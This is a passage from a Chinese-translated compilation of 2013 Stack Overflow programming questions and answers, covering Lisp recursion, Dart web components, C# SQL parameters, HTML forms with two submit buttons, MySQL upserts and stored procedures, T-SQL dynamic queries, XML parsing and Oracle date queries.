StatusID    (Autonumber)    Primary Key
Description (Text) 
```

表关系：

```
MasterTable (One) --> (Many) SubjectTable
StatusTable (One) --> (Many) MasterTable 
```

表 1 中要插入 MasterTable 的数据：

```
StudentID Description
JP121     Description 1
SP223     Description 2
JK111     Description 3 
```

插入查询：

```
INSERT INTO Master ( StudentID )
SELECT Table1.StudentID
FROM Table1; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:35:40.533

您是否以编程方式运行 INSERT 查询？也许它被执行了多次。

编辑：只是一个愚蠢的查询问题。

# list - 从 lisp 列表中删除一个元素

> ID：15262382
> 
> 赞同：3
> 
> 时间：2013-03-07T03:09:35.973
> 
> 标签：list, lisp

我正在为计算机科学课做作业，但遇到了障碍。我知道社区反对对家庭作业项目给出明确的答案，而这并不是我来这里的真正目的；我希望能走上正确的轨道或思考过程。我会尽量提供尽可能多的信息，以便让您了解我正在处理的内容以及我是如何被阻止的。

首先，这是对 LISP 语言的快速“介绍”。该课程将带我们了解几种不同类型的语言，让我们深入了解编程的不同方面以及它们的发展历史。因此，项目规则如下：

*   不能使用任何循环函数；相反，必须使用递归
*   只能使用以下固有函数**setq**、**cons**、**append**、**list**、**equal**、**defun**、**car**、**cdr**和**cond**
*   可以创建“帮助函数”，可用于在函数条件中创建额外步骤（有点像嵌套条件）

我遇到的问题是我应该创建一个函数，该函数将列表作为参数，扫描该列表以查找重复项，并删除重复项，将列表返回。因此，如果我传递了一个 '(abcbadea) 列表，它将返回 (abcde)。

到目前为止，我认为最好创建一个名为**list_member**的函数，它将元素与列表进行比较，如果元素在列表中则返回 T ，如果不在列表中则返回 nil 。

```
(defun list_member (x L)
  (cond ((null L) nil)             ;if list L is empty, return NIL
    ((equal x (car L)) T)          ;if element x is in L, return T
    (T (list_member x (cdr L)))))  ;else, recursively check remainder of L 
```

我想在函数 rem_dup 中使用它，我已经开始在下面填写：

```
(defun rem_dup (L)
   (cond ((null L) nil)                     ;if list L is empty, return NIL to user
     (( list_member (car L) cdr L )) (...)  ;part I am having trouble with
     (T (rem_dup (cdr L)))))                ;else, check rest of list recursively 
```

我的问题是，我似乎无法通过可用的功能弄清楚如何将列表与删除的重复项放在一起。本质上，当 list_member 返回 true 时，我不知道从哪里开始。保持列表格式的唯一函数是 APPEND，因为我正在处理单个元素（在这种情况下，甚至嵌套列表也被视为一个元素）。我可以使用的所有列表连接函数（APPEND、CONS、LIST）都是非破坏性的。

我想出了很多解决方案，但返回的列表甚至不接近我想要的。我认为在这里列出它们可能会造成混乱。我一直在问自己正确的问题，所以我想我会把它交给每个人，看看他们是否能提出一个我还没有想到的问题。

我很欣赏你的见解。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-07T03:19:29.050

你有你的情况倒退。如果第一个元素在列表的其余部分中，则它是重复的，因此您要省略它。否则，您希望返回一个包含第一个元素的列表，该列表`rem_dup`位于其余元素的前面。

```
(defun rem_dup (L)
   (cond ((null L) nil)                         ; if list L is empty, return NIL to user
         ((list_member (car L) (cdr L )) (rem_dup (cdr L))) ; Skip duplicate element
         (T (cons (car L) (rem_dup (cdr L)))))) ; else include it, and check rest of list recursively 
```

# dart - 创建 WebComponent 时如何将变量传递给它？

> ID：15262383
> 
> 赞同：1
> 
> 时间：2013-03-07T03:09:37.150
> 
> 标签：dart, dart-webui

我有一个`Login`具有`LoginState`字段的 web 组件。我想传入一个`LoginState`实例，该实例可能在代码的其他部分中设置，并`Login`在创建方法之前/期间将其添加到实例中。

这可能吗？如果没有，我的替代方案是什么？我能想到的唯一另一个方法是使用一个全局变量来保存`LoginState`实例并引用它，这似乎不是一个好主意。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T08:36:28.383

确实有可能，在实例化组件时，使用语法

```
<x-custom-element a-field-name="{{expression}}"></x-custom-element> 
```

该表达式将被评估，并且您在 CustomElement 类中定义的任何字段都将使用（[参见相关讨论](https://groups.google.com/a/dartlang.org/forum/?fromgroups=#!topic/web-ui/ugxpNUW-oZA)）`aFieldName`的值进行初始化。就我个人而言，我不建议传递像你的登录状态这样的东西，因为它会使你的网站非常容易受到 XSS 攻击......`{{expression}}`

也许更好的主意是在您的组件类上公开一个方法，该方法允许您在初始化后设置登录状态。将元素插入 DOM 后，您可以访问元素的字段，`query('#myLoginStateId').xtag`然后使用您的登录状态调用公开的方法。

在将元素插入 DOM 之前，您将无法访问元素上的 xtag，因此请确保在元素的 insert() 方法中引发适当的事件，以便应用程序的其余部分知道何时可以安全地设置适当的领域。

# c# - 如何使用带有参数数组的 sqlconnection 执行存储过程来创建 C# 方法

> ID：15262387
> 
> 赞同：0
> 
> 时间：2013-03-07T03:09:55.087
> 
> 标签：c#, arrays, stored-procedures, methods, sqlparameter

使用下面的代码，我正在执行名为“sp_InsertTradingAcctTransFront”的存储过程，其中包含 4 个参数。

现在，我不想键入每个参数，而是将参数和字段作为数组来执行。

喜欢：

```
 cmd.Parameters.Add(new SqlParameter("@sp parametername", param); 
```

请注意 param 是一个`Array`.

```
private void Methodname(SQlConn, param)
{
  //param as ARRAY of parameters

    cmd.CommandText = "sp_InsertTradingAcctTransFront";
    cmd.Parameters.Add(new SqlParameter("@mBatchName", mCollectionID));
    cmd.Parameters.Add(new SqlParameter("@mTATCash", mTATCash));
    cmd.Parameters.Add(new SqlParameter("@mTATradingOrdinary", mTATradingOrdinary));
    cmd.Parameters.Add(new SqlParameter("@mTATradingType", mTATradingType)); 
    cmd.ExecuteNonQuery();
    SQLConn.close()

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:35:44.027

我相信使用 a 会更容易[`Dictionary(TKey, TElement)`](http://msdn.microsoft.com/en-us/library/xfhwa508.aspx)

```
private void QueryDatabase(string connectionString, string commandText, IDictionary<string, object> parameters)
{
    using(var connection = new SqlConnection(connectionString))
    using(var command = connection.CreateCommand())
    {
        command.CommandText = commandText;
        command.Parameters.AddRange(parameters.Select(l => new SqlParameter(l.Key, l.Value)));
        command.CommandType = CommandType.StoredProcedure;

        connection.Open()
        command.ExecuteNonQuery();
    }

} 
```

编辑：

```
public interface IParameterizable
{
    IEnumerable<SqlParameter> GetParameters();
}

public SqlParameterAttribute : Attribute
{
    public string Name { get; set; }
}

public class InsertTradingAcctTransFrontParameters : IParameterizable
{
    [SqlParameter( Name = "@mBatchName" )]
    public int CollectionId { get; set; }

    /* ... */

    IEnumerable<SqlParameter> GetParameters()
    {
        // Validation for properties, etc...
        if(0 > CollectionId) throw new MeaningfulException("CollectionId must be greater than 0");

        yield return new SqlParameter(GetParameterName("CollectionId"), CollectionId);
    }

    private string GetParameterName(string propertyName)
    {
        var attribute = GetType().GetProperty(propertyName).GetCustomAttributes(typeof(SqlParameterAttribute), false).SingleOrDefault();

        if(attribute == null) throw new NotImplementedException(string.Format("SqlParameter is not defined for {0}", propertyName);

        return ((SqlParameterAttribute)attribute).Name;
    }
} 
```

然后你可以改变你的查询方法：

```
private void QueryDatabase(string connectionString, string commandText, IParameterizable parameters)
{
    using(var connection = new SqlConnection(connectionString))
    using(var command = connection.CreateCommand())
    {
        command.CommandText = commandText;
        command.Parameters.AddRange(parameters.GetParameters());
        command.CommandType = CommandType.StoredProcedure;

        connection.Open()
        command.ExecuteNonQuery();
    }

} 
```

在这一点上，它是非常可重用的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:24:12.370

您可以使用[SqlParameterCollection.AddRange](http://msdn.microsoft.com/en-us/library/0e42546a.aspx)方法。

例子：

```
Array a = Array.CreateInstance(typeof(SqlParameter), 4);
a.SetValue(new SqlParameter("@mBatchName", mCollectionID), 0);
a.SetValue(new SqlParameter("@mTATCash", mTATCash), 1);
a.SetValue(new SqlParameter("@mTATradingOrdinary", mTATradingOrdinary), 2);
a.SetValue(new SqlParameter("@mTATradingType", mTATradingType), 3);
cmd.Parameters.AddRange(a); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T03:16:50.923

假设您的代码确保参数数量正确，您可以使用数组索引 ( `[#]`) 引用数组中的每个项目：

```
private void Methodname(string SQLConn, object[] param)
{
    ...
    cmd.Parameters.Add(new SqlParameter("@mBatchName", param[0]));
    cmd.Parameters.Add(new SqlParameter("@mTATCash", param[1]));
    cmd.Parameters.Add(new SqlParameter("@mTATradingOrdinary", param[2]));
    cmd.Parameters.Add(new SqlParameter("@mTATradingType", param[3])); 
```

如果您正在谈论传递`SQLParameter`对象数组，则可以使用`AddRange`所有集合类型公开的将数组的全部内容附加到集合中：

```
private void Methodname(string SQLConn, SQLParameter[] param)
{
    ...
    cmd.Parameters.AddRange(param); 
```

# jquery - 一个 HTML 表单两个提交按钮 - 这是 jquery 的限制吗？

> ID：15262388
> 
> 赞同：0
> 
> 时间：2013-03-07T03:09:57.833
> 
> 标签：jquery, html, forms

据我所知，以下是不可能的，如果不是，这是 jquery 的明显限制。

我想要一个带有两个提交按钮的 html 表单。无法提交表单并检测使用哪个按钮提交。

一种方法是使用 click(function() ，但这样做会失去对表单任何字段的访问权，并且无​​法引用表单。事实上，这种方法使用的链接看似是表单，但实际上不是！

在我看来这样的基本需求，怎么可能不支持。表单通常有两个提交选项……例如“提交”和“编辑”。任何一个选项都需要在提交和用户提交的表单数据时采取不同的操作？这怎么可能？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:26:55.950

只是一个例子。

```
<form action="action.php" method="post"> 
Enter a number: <input type="text" name="number" size="3"> <br>
<input type="submit" name="add" value="Add 10">
<input type="submit" name="subtract" value="Subtract 10"> 
</form>

<?php

// check which button was clicked
// perform calculation
if ($_POST['add'])
{
    echo $_POST['number'] . " + 10 = " . ($_POST['number']+10); 
} else if ($_POST['subtract']) {
    echo $_POST['number'] . " - 10 = " . ($_POST['number']-10); 
}

?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:23:16.887

我不完全确定您要使用两个提交按钮做什么。但是，如果它是您想要的字段中的数据，基于哪个按钮被按下，完全可以使用简单的逻辑来检测哪个按钮被单击，然后使用 jQuery 通过 ID 访问每个表单字段。

```
$('#btn1').click(function() { $('#field1').doSomething() });
$('#btn2').click(function() { $('#field1').doSomething() }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T03:36:17.277

我在我的服务器上做了一个简单的测试：

```
<form method="POST" action="/test/post.php" target="_blank" id="form">
    <input type="search" name="q" value="WTF" />
    <input type="submit" name="b1" value="Search" />
    <input type="submit" name="b2" value="Find" />
</form>
<button type="button" onclick="id('form').submit();">Go</button> 
```

`post.php`只是`print_r($_POST);`一个. 结果如下：

*   按`Search`：

    ```
    Array
    (
        [q] => WTF
        [b1] => Search
    ) 
    ```

*   按`Find`：

    ```
    Array
    (
        [q] => WTF
        [b2] => Find
    ) 
    ```

*   按下：`[Enter]`_`<input type="search">`

    ```
    Array
    (
        [q] => WTF
        [b1] => Search
    ) 
    ```

*   使用`<button>`外部：

    ```
    Array
    (
        [q] => WTF
    ) 
    ```

# mysql - Mysql将数据从一个表复制到另一个表，重复键更新不起作用，重复数据

> ID：15262390
> 
> 赞同：1
> 
> 时间：2013-03-07T03:10:05.150
> 
> 标签：mysql, insert, duplicates

这是我要复制的mysql数据

表“问题”

```
id|question_text  |priority|quiz_id|
1 |<p>Letter D</p>|   1    |    1  |
2 |<p>Letter B</p>|   2    |    1  |
3 |<p>Letter C</p>|   3    |    1  | 
```

然后这是我的新表我已经有两个问题表'testbank_question'

```
id|question_id|question_text  |priority|quiz_id|
89|        1  |<p>Letter A</p>|   1    |    1  |
90|        2  |<p>Letter B</p>|   2    |    1  | 
```

当我更新时，我希望结果在我的新表“testbank_question”中看起来像这样

```
id |question_id|question_text  |priority|quiz_id|
89 |        1  |<p>Letter D</p>|   1    |   1  |
90 |        2  |<p>Letter B</p>|   2    |   1  |
150|        3  |<p>Letter C</p>|   3    |   1  | 
```

--table 'questions' 创建 statemate

```
CREATE TABLE IF NOT EXISTS `questions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `question_text` varchar(3800) DEFAULT NULL,
  `question_type_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL,
  `quiz_id` int(11) NOT NULL,
  `point` decimal(18,0) NOT NULL,
  `added_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `parent_id` int(11) NOT NULL,
  `question_total` decimal(18,0) DEFAULT NULL,
  `check_total` int(11) DEFAULT NULL,
  `header_text` varchar(1500) CHARACTER SET utf8 DEFAULT NULL,
  `footer_text` varchar(1500) CHARACTER SET utf8 DEFAULT NULL,
  `question_text_eng` varchar(1800) CHARACTER SET utf8 DEFAULT NULL,
  `help_image` varchar(550) CHARACTER SET utf8 DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `quiz_id` (`quiz_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

INSERT INTO `questions` (`id`, `question_text`, `question_type_id`, `priority`, `quiz_id`, `point`, `added_date`, `parent_id`, `question_total`, `check_total`, `header_text`, `footer_text`, `question_text_eng`, `help_image`) VALUES
(1, '<p>\r\n    Letter A</p>', 1, 1, 1, 1, '2013-03-06 09:12:58', 0, NULL, NULL, '', '', NULL, NULL),
(2, '<p>\r\n    Letter B</p>', 1, 2, 1, 1, '2013-03-06 09:13:21', 0, NULL, NULL, '', '', NULL, NULL),
(3, '<p>\r\n    letter C</p>', 1, 3, 1, 1, '2013-03-06 13:43:48', 0, NULL, NULL, '', '', NULL, NULL);

ALTER TABLE `questions`
  ADD CONSTRAINT `questions_ibfk_1` FOREIGN KEY (`quiz_id`) REFERENCES `quizzes` (`id`) ON DELETE CASCADE; 
```

--

## -- 表的表结构`testbank_question`

```
CREATE TABLE IF NOT EXISTS `testbank_question` (
  ` id` int(100) NOT NULL AUTO_INCREMENT,
  `question_id` int(100) NOT NULL,
  `question_text` varchar(3800) NOT NULL,
  `question_type_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL,
  `quiz_id` int(11) NOT NULL,
  `point` decimal(18,0) NOT NULL,
  `added_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `parent_id` int(11) NOT NULL,
  `question_total` decimal(18,0) NOT NULL,
  `check_total` int(11) NOT NULL,
  `header_text` varchar(1500) NOT NULL,
  `footer_text` varchar(1500) NOT NULL,
  `question_text_eng` varchar(1800) NOT NULL,
  `help_image` varchar(550) NOT NULL,
  PRIMARY KEY (` id`),
  KEY `quiz_id` (`quiz_id`),
  KEY `question_id` (`question_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=176 ; 
```

--

## -- 为表转储数据`testbank_question`

```
INSERT INTO `testbank_question` (` id`, `question_id`, `question_text`, `question_type_id`, `priority`, `quiz_id`, `point`, `added_date`, `parent_id`, `question_total`, `check_total`, `header_text`, `footer_text`, `question_text_eng`, `help_image`) VALUES
(89, 1, '<p>\r\n    Letter A</p>', 1, 1, 1, 1, '2013-03-06 09:12:58', 0, 0, 0, '', '', '', ''),
(90, 2, '<p>\r\n    Letter B</p>', 1, 2, 1, 1, '2013-03-06 09:13:21', 0, 0, 0, '', '', '', ''); 
```

--

## -- 表格约束`testbank_question`

```
ALTER TABLE `testbank_question`
  ADD CONSTRAINT `testbank_question_ibfk_1` FOREIGN KEY (`quiz_id`) REFERENCES `testbank_quizzes` (`copy_id`) ON DELETE CASCADE; 
```

在我的新表中，字段 question_id 等于我要复制的数据的 id。这是我在 PHP 中的代码

```
INSERT INTO testbank_question
        (question_id,
         quiz_id,
         question_text,
         question_type_id,
         priority,point,
         added_date,
         parent_id,
         question_total,
         check_total,
         header_text,
         footer_text,
         question_text_eng,
         help_image) 
  SELECT         id,
         quiz_id,
         question_text,
         question_type_id,
         priority,
         point,
         added_date,
         parent_id,
         question_total,
         check_total,
         header_text,
         footer_text
         ,question_text_eng,
         help_image 
  FROM questions WHERE
        questions.quiz_id='1' ON DUPLICATE KEY UPDATE
     testbank_question.question_id = VALUES(testbank_question.question_id) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:54:25.780

您确实应该发布您的表创建语句，但您似乎也误解了`ON UPDATE`语法。

对于 on update，您应该明确设置要更新的列，这似乎是`question_text`列。您还需要设置哪些列需要用于`UNIQUE`约束。

```
CREATE TABLE IF NOT EXISTS new_schema.questions (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `question_text` varchar(3800) DEFAULT NULL,
  `question_type_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL,
  `quiz_id` int(11) NOT NULL,
  `point` decimal(18,0) NOT NULL,
  `added_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `parent_id` int(11) NOT NULL,
  `question_total` decimal(18,0) DEFAULT NULL,
  `check_total` int(11) DEFAULT NULL,
  `header_text` varchar(1500) CHARACTER SET utf8 DEFAULT NULL,
  `footer_text` varchar(1500) CHARACTER SET utf8 DEFAULT NULL,
  `question_text_eng` varchar(1800) CHARACTER SET utf8 DEFAULT NULL,
  `help_image` varchar(550) CHARACTER SET utf8 DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `quiz_id` (`quiz_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;

CREATE TABLE `testbank_question` (
  `id` int(100) NOT NULL AUTO_INCREMENT,
  `question_id` int(100) NOT NULL,
  `question_text` varchar(3800) NOT NULL,
  `question_type_id` int(11) NOT NULL,
  `priority` int(11) NOT NULL,
  `quiz_id` int(11) NOT NULL,
  `point` decimal(18,0) NOT NULL,
  `added_date` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `parent_id` int(11) NOT NULL,
  `question_total` decimal(18,0) NOT NULL,
  `check_total` int(11) NOT NULL,
  `header_text` varchar(1500) NOT NULL,
  `footer_text` varchar(1500) NOT NULL,
  `question_text_eng` varchar(1800) NOT NULL,
  `help_image` varchar(550) NOT NULL,
  PRIMARY KEY (` id`),
  UNIQUE KEY `unique_quizID_priority` (`quiz_id`,`priority`),
  KEY `quiz_id` (`quiz_id`),
  KEY `question_id` (`question_id`)
) ENGINE=InnoDB AUTO_INCREMENT=180 DEFAULT CHARSET=latin1;

iNSERT INTO new_schema.questions ( `question_text`, `question_type_id`, `priority`, `quiz_id`, `point`, `added_date`, `parent_id`, `question_total`, `check_total`, `header_text`, `footer_text`, `question_text_eng`, `help_image`) VALUES
(' Letter A', 1, 1, 1, 1, '2013-03-06 09:12:58', 0, NULL, NULL, '', '', NULL, NULL),
(' Letter B', 1, 2, 1, 1, '2013-03-06 09:13:21', 0, NULL, NULL, '', '', NULL, NULL),
('letter C', 1, 3, 1, 1, '2013-03-06 13:43:48', 0, NULL, NULL, '', '', NULL, NULL);

INSERT INTO testbank_question
        (question_id,
         quiz_id,
         question_text,
         question_type_id,
         priority,point,
         added_date,
         parent_id,
         question_total,
         check_total,
         header_text,
         footer_text,
         question_text_eng,
         help_image) 
  SELECT         id,
         quiz_id,
         question_text,
         question_type_id,
         priority,
         point,
         added_date,
         parent_id,
         question_total,
         check_total,
         header_text,
         footer_text
         ,question_text_eng,
         help_image 
  FROM questions 
WHERE
        questions.quiz_id='1' 
ON DUPLICATE KEY UPDATE
     testbank_question.question_text = questions.question_text;

iNSERT INTO new_schema.questions ( `question_text`, `question_type_id`, `priority`, `quiz_id`, `point`, `added_date`, `parent_id`, `question_total`, `check_total`, `header_text`, `footer_text`, `question_text_eng`, `help_image`) VALUES
( 'Letter D', 1, 1, 1, 1, '2013-03-06 09:12:58', 0, NULL, NULL, '', '', NULL, NULL),
( 'Letter E', 1, 2, 1, 1, '2013-03-06 09:13:21', 0, NULL, NULL, '', '', NULL, NULL),
( 'letter F', 1, 3, 1, 1, '2013-03-06 13:43:48', 0, NULL, NULL, '', '', NULL, NULL);

INSERT INTO testbank_question
        (question_id,
         quiz_id,
         question_text,
         question_type_id,
         priority,point,
         added_date,
         parent_id,
         question_total,
         check_total,
         header_text,
         footer_text,
         question_text_eng,
         help_image) 
  SELECT         id,
         quiz_id,
         question_text,
         question_type_id,
         priority,
         point,
         added_date,
         parent_id,
         question_total,
         check_total,
         header_text,
         footer_text
         ,question_text_eng,
         help_image 
  FROM questions 
WHERE
        questions.quiz_id='1' 
ON DUPLICATE KEY UPDATE
     testbank_question.question_text = questions.question_text;

select * from new_schema.testbank_question; 
```

将输出："id",question_id,question_text,question_type_id,priority,quiz_id,point, added_date,parent_id,question_total,check_total,header_text,footer_text,question_text_eng,help_image 182,22,”字母 D”,1,1,1,1 ,"2013-03-08 01:11:36",0,0,0,,,, 183,23,"字母 E",1,2,1,1,"2013-03-08 01:11: 36",0,0,0,,,, 184,24,"字母 F",1,3,1,1,"2013-03-08 01:11:36",0,0,0,,, ,

显示的文本已被覆盖。如果要更新其他列，则需要在`ON UPDATE`查询部分中设置它们。

此外，您应该（几乎）永远不要将自动增量值插入到表中。让 MySQL 为您解决这个问题。此外，您在 testbank_question 表的“id”中有一个空格类型。

# mysql - MySQL：为什么过程比执行查询慢？

> ID：15262397
> 
> 赞同：0
> 
> 时间：2013-03-07T03:11:01.810
> 
> 标签：mysql, sql, procedure

所以我有这个超级查询，它根据它们与原始文章共有的标签数量（在 $id 变量中提供）来查找“相关文章”。我不知道实际查询是否重要，但这里是 Justin Case。

现在，我从未在实际项目中实际使用过过程，但我读过它们应该更快，部分原因是 MySQL 引擎不需要每次都解释代码。但是，当我将相同的代码放入一个过程并调用该过程时，执行时间平均要长约 450 倍。

为什么？是因为它返回多行吗？程序臭吗？是因为我必须在我的程序中使用输入变量吗？450是一堆！

```
SELECT a.id, a.image, a.title, a.excerpt, a.permalink, COUNT(rel.category_id) AS n
  FROM articles AS a
  JOIN category_relations AS rel ON rel.article_id = a.id
  JOIN categories AS c ON rel.category_id = c.id
 WHERE rel.category_id IN (SELECT category_id 
                             FROM category_relations 
                            WHERE article_id = {$id})
   AND a.id != {$id}
   AND c.type = 1
GROUP BY rel.article_id
ORDER BY n DESC, publish_date DESC
   LIMIT 10 
```

用于创建过程的代码：

```
DROP PROCEDURE IF EXISTS get_related_articles;
DELIMITER //
CREATE PROCEDURE get_related_articles(IN id INT)
BEGIN
   SELECT   a.id, a.image, a.title, a.excerpt, a.permalink, COUNT(rel.category_id) AS n
   FROM     articles AS a
    JOIN  category_relations AS rel ON rel.article_id = a.id
    JOIN  categories AS c ON rel.category_id = c.id
   WHERE    rel.category_id IN ( SELECT category_id FROM category_relations WHERE article_id = id)
    AND   a.id != id
    AND   c.type = 1
   GROUP BY rel.article_id
   ORDER BY n DESC, publish_date DESC
   LIMIT    10;
END //
DELIMITER ; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T09:03:19.067

欢迎来到 MySQL 的真实世界！有时很难说为什么一个查询的执行时间比另一个查询长。但在你的情况下，答案可以在[这里](http://dev.mysql.com/doc/refman/5.0/en/query-cache-operation.html)找到：

> MySQL 不使用缓存来处理从存储过程中调用的查询。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:24:42.603

对您的延迟不利，但 IN SUBSELECTS 本身可能代价高昂。您是否考虑过加入您现在的子选择？此外，由于文章表是查询的基础，并且 a.id = rel.article_id，如果通过索引可用，您对“a.id”的分组可能会更好。

```
SELECT 
      a.id, 
      a.image, 
      a.title, 
      a.excerpt, 
      a.permalink
   FROM 
      articles AS a
         JOIN category_relations AS rel 
            ON a.id = rel.article_id 
            JOIN categories AS c 
               ON rel.category_id = c.id
               AND c.type = 1
            JOIN (SELECT category_id 
                     FROM admin_category_relations 
                     WHERE article_id = {$id} ) RelByArticle
               on rel.category_id = RelByArticle.category_id
   WHERE 
      a.id != {$id}
   GROUP BY 
      a.id
   ORDER BY 
      n DESC, 
      publish_date DESC
   LIMIT 10 
```

# tsql - 从变量查询中返回一个输出参数

> ID：15262401
> 
> 赞同：0
> 
> 时间：2013-03-07T03:11:43.860
> 
> 标签：tsql

我正在尝试构建一个存储过程，它将 ID 转换为给定数据库中任何键的可显示值。为此，我添加了一个名为 LookupMap 的表，它指定了哪些字段用于 KeyField 和 DisplayField。

```
TableName     KeyField      DisplayField
---------     --------      ------------
Company       CompanyId     CompanyName
Location      LocationId    LocationName 
```

我想传入一个表名和一个 Key 值并取回 Display 值。以下是我尝试失败的方法：

```
Create Procedure [dbo].[GetLookup]
@TableName varchar(50), 
@Key varchar(50),
@DisplayValue varchar(255) out
AS
BEGIN
DECLARE @DisplayField varchar(50)
DECLARE @IdField varchar(50)
Select @DisplayField = DisplayField, @IdField = IdField 
    From LookupMap where TableName = @TableName

DECLARE @sql NVARCHAR(500)
SET @sql = N'SET @DisplayValue = (SELECT ' + @DisplayField + N' FROM ' + @TableName + 
               N' WHERE ' + @IdField + N' = ''' + @Key + N''')'

Print @sql
Set @DisplayValue = (EXEC (@sql))

END 
```

一切都工作到最后一行，但我不知道如何从动态查询中取回一个值并将其分配给一个 out 参数。此外，虽然我知道键是唯一的并且只有一个匹配项，但我意识到我需要一些东西来将表结果分配给 varchar。

并随时告诉我我的方法都是错误的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T19:30:06.023

您可以创建一个临时表并将 exec(@sql) 用于插入语句，而不是尝试直接通过动态 SQL 设置变量。

所以

```
 CREATE TABLE #Result (result varchar(50))

    DECLARE @sql NVARCHAR(500)
            SET @sql = N'SELECT ' + @DisplayField + N' FROM ' + @TableName + 
                   N' WHERE ' + @IdField + N' = ''' + @Key + N''''

    INSERT INTO #Result
    EXEC(@sql)

    SELECT @DisplayField = result FROM #Result 
```

# c# - 如何在xml中找到单个子节点

> ID：15262403
> 
> 赞同：0
> 
> 时间：2013-03-07T03:11:53.313
> 
> 标签：c#, xml

```
<bookstore>
    <book>
         <title>bob</title>
         <author>fred</author>
     </book>
... 
```

使用 C# `XmlTextReader`，我如何打印出作者，只有当书名是`bob`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:00:36.220

您可以使用 XmlDocument

1.  将 getElementByTagName 用于“书”
2.  遍历元素并使用条件来获得包含“BOB”的正确标题
3.  从该父书节点获取作者值。

希望你明白需要做什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-11T15:22:39.660

您可以使用 xpath 查找节点：

```
XmlDocument xmlDoc = new XmlDocument();
xmlDoc.Load("yourfile.xml"); 
string path = "/bookstore/book[title='bob']"; // find the book node only when the book title is bob
XmlNode node = xmlDoc.SelectSingleNode(path); // get the book node
string author = node.SelectSingleNode("author").InnerText; // find the author node, return its inner text 
```

如果书名的值不是唯一的，您可以使用 XmlDocument.SelectNodes 代替。

```
XmlNodeList books = xmlDoc.SelectNodes(path); // find all books whose title is bob 
foreadh(XmlNode book in books)
{
    string author = node.SelectSingleNode("author").InnerText;
    ...
} 
```

# sql - 列出 2 行中的重复日期

> ID：15262408
> 
> 赞同：1
> 
> 时间：2013-03-07T03:12:07.893
> 
> 标签：sql, oracle

第一次问所以我们走了。我使用 Oracle SQL 并有一个包含列的表

RNUMBER 作为数字，PID 作为数字，VIEWDATE 作为日期，RENTED 作为 char(1)

有多个行具有重复的 RNUMBER，但 VIEWDATE 不同。我正在尝试使用将显示 RNUMBER、PID、第一个 VIEWDATE、最后一个 VIEWDATE 的查询。它应该与 RNUMBERS 匹配，最后一个 VIEWDATE 将具有 RENTED = 'Y'。

这是我最接近的查询。

```
select a.*
from LabDataS13.lookedat a
inner join
  (select RNumber
  from LabDataS13.lookedat
  where RENTED like 'N'
  group by RNumber
  having count(*) > 1) b
on a.RNumber = b.RNumber
where a.RENTED like 'Y'
order by a.RNUMBER 
```

有点失落。任何帮助，将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:27:36.680

由于您已将 last 定义为“Y”，因此您只需要第一条记录。要获得第一个，您可以使用 Row_number 。

```
WITH first 
     AS (SELECT Row_number() 
                  over ( 
                    PARTITION BY rnumber
                    ORDER BY viewdate ) rn, 
                rnumber, 
                pid, 
                viewdate, 
                rented 
         FROM   labdatas13.lookedat) 
SELECT * 
FROM   labdatas13.lookedat last 
       inner join first 
               ON first.rnumber= last.rnumber
WHERE  last.rented = 'Y' 
       AND first.rn = 1 
```

[演示](http://sqlfiddle.com/#!4/0307b/2)

如果由于某种原因您不能在租用时依赖“Y”，那么您只需添加第二个 ROW_NUMBER 以另一种方式排序，然后使用 WITH 子句中的数据

```
WITH data
     AS (SELECT Row_number() 
                  over ( 
                    PARTITION BY rnumber
                    ORDER BY viewdate ) rn_first,
                Row_number() 
                  over (
                    PARTITION BY rnumber
                    ORDER BY viewdate desc ) rn_last, 
                rnumber, 
                pid, 
                viewdate, 
                rented 
         FROM   labdatas13.lookedat) 
SELECT * 
FROM   data first
       inner join data lastg
               ON first.rnumber= last.rnumber
WHERE  
  first.rn_first = 1
  AND last.rn_last= 1 
```

[演示](http://sqlfiddle.com/#!4/0307b/10)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T09:28:12.743

期望每个 rnumber 有多个 viewdates 条目，并且每个 rnumber 的最后一个 viewdate 将已租用='Y'，其余的将不是 'Y'

```
select a.rnumber,a.pid,first_viewdate,last_viewdate from 
(select rnumber,pid,viewdate as last_viewdate from table where rented='Y') a,
(select rnumber,pid,viewdate as first_viewdate from table where rowid in 
(select min(rowid) from table group by rnumber) and rented !='Y') b
where a.rnumber=b.rnumber; 
```

# java - How can I implement this REST API and stay DRY?

> ID：15262425
> 
> 赞同：7
> 
> 时间：2013-03-07T03:13:31.713
> 
> 标签：java, spring, jersey, jax-rs, spring-data

